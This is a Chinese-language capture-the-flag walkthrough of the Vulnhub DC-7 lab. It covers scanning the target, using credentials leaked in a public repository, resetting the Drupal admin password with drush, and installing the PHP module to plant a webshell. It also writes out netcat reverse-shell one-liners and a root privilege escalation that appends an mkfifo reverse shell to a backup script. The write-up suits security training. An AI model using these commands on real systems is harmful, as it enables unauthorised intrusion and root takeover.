\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/hcH1Uu24paa8DT5T8ARtyw)

说明：Vulnhub 是一个渗透测试实战网站，提供了许多带有漏洞的渗透测试靶机下载。适合初学者学习，实践。DC-7 全程只有一个 falg，获取 root 权限，以下内容是自身复现的过程，总结记录下来，如有不足请多多指教。

下载地址：

Download: http://www.five86.com/downloads/DC-7.zip

目标机 IP 地址：192.168.5.142  
攻击机 kali IP 地址：192.168.5.135

arp-scan -l  发现目标主机。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRsf7jEc1OWXeWT1bjzx6JRUvYD8fFNk4ST0rfibrcLkrAr9z8icFHWKibXg/640?wx_fmt=png)

扫描端口 

```
nmap -sS -sV -p- 192.168.5.142
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRsiarLUGFSEs6NGmariaetUgmTS1cibSu1OWAcHHOicHkLoCHU4CSxW66FOA/640?wx_fmt=png)

访问 80 端口是 Drupal CMS。页面中提示我们强行的爆破不会成功，让我们尝试一下对外方式。社工操作。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2t6eichRrT4Ge72BBcqt4KITTtyLItGf01BD6YH8eqITdyh7UycA8C7w/640?wx_fmt=png)

某度下搜了一下 @DC7USER, 发现开源项目。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2orammMBBSZZEZ3RTh7cUcoIxtdKXnAt8NoysRSYF8F6rpm473JW6xQ/640?wx_fmt=png)

查看 config 配置文件，存在一位用户名以及密码, ssh 登录。

dc7user/MdR3xOgB7#dW

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRsopq3zdA01aAicEQGfolafxe5y7yfsMiao9DLpxqib1AgaUwicibD0hAibPbg/640?wx_fmt=png)

ssh 连接成功。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRs2VqR93CgjRe9VCvFRHHWBGgN22PxmlllGUK9ibrOKo547f8ibxEcvIcQ/640?wx_fmt=png)

home 目录下存在一个文件夹，还有一个 mbox 文件。  

查看 mbox 发现一封邮件，记录了一些对数据库的转存内容。

好像是说数据库转存到了 / home/dc7user/backups/website.sql

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRsX2DRcLzExrRu0nN3wlzDmsEphkGnsiciclnjcVt4FFLibKAw7aib9qAKsQ/640?wx_fmt=png)

发现两个 gpg 后缀的文件，.gpg 后缀的文件是某种加密文件。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2gIDmG5poEwDM9ZaSSIZibBdQDaZpOEibHVUNpHqSzL7AdZceic0zA44cw/640?wx_fmt=png)

/opt/scripts/backups.sh 文件只有 www 和 root 用户才可执行。我通过 backups.sh 发现该站配置了 drush。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2exiaTXjEC4Muib5BnrNyWYWpZ4nmZwR0PpTvskhGLXHcE5I8AkVPQNBA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2gRrFHa0wZicMAyhibxvIbymVd81QqdtSHicCqqJ73LUStjYdeiakZXXMkw/640?wx_fmt=png)

Drupal 使用 Drush 是专门服务于 drupal 的第三方模块。

使用 drush 来更改 admin 用户的密码。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRsQOqqeoiaLmibibkDYslkJuQoUiacmSF0nl1r6ILOvXxf9tZjCJKEdwcoicA/640?wx_fmt=png)  

可通过 drush 修改 admin 的密码。  

```
drush user-password admin --password="gem"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25Zx6sHyzjJgWbicA6nnEwRsXqXYrsH9kBsXIiaKFP8VxOANxNx8fzO6xzjiamAdErJcrW2yMhDqqzWw/640?wx_fmt=png)  

后台登陆成功。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2lSVPWw3G4nbicToXCYUlrogyMMZjg7MaXE7r89XdphZoPSCLt7eNDwQ/640?wx_fmt=png)

点击 extend 扩展 php 模块。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2wiaURARx8CNEzukw0BPSia0xA74IGZicKQITy5es07XKzfhU8aNTzjdXQ/640?wx_fmt=png)

下载 php 模块：  

https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz

添加进去。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2iabqZkKc8wic1JibrhicWkmwmZjKfWQ5kVuoicm8ekF0rQe7SjYyicozvhmg/640?wx_fmt=png)

开启 php 模块，点击后 install 后即可。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2QCiaBvVR09TKIJHicV1ETRiafzib3aj94LEGGD3JhxXMOcjzXia2ia8NgK5g/640?wx_fmt=png)

添加模板，尝试执行 php 代码。  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2SduPQhavvzT6Et6EwzATDkb7iciaJCt57JjpQCYniaoXVrd28n7Kzbv9A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2SKLSy7Sc7Rtdn8NvAEKGgUibBmv3PhZcOWwenUW20YiapHm13HvTKILQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2Tibaj6EfEJr1CHOfibibfwj8q8ExUQbty7TzzqzeXRbnic2ZJlVKREP89w/640?wx_fmt=png)

写入一句话，蚁剑连接，反弹 shell。

```
nc 192.168.5.135 7777 -e /bin/bash
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2VnXI9IA31wTCGrqZDRX7hYwxuG5IwVkqqCjSQXC083IezicfmKicgGwQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2AydK5rx1amc7ibZZDMklzreQHeAEiaX0nywgLr0SAk2uSgPhsKmNI9Xg/640?wx_fmt=png)

转换交互式 shell。

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

提权: 写入 backups.sh 获取 root 权限。

```
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.5.135 8888 >/tmp/f" >> backups.sh
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2xhbCErnicog3aDfKsmSGhg4lym1bVMH5pd8dROHZ7utxiaaCkERiak25Q/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/zg4ibGYrEa25v8hM6vwZakEosw1o2Q1f2RlUMpjY1kXVQkkW18fwuAqHqfX0yTA6OHoNMcPj9ohGIa6LfePT1Qg/640?wx_fmt=png)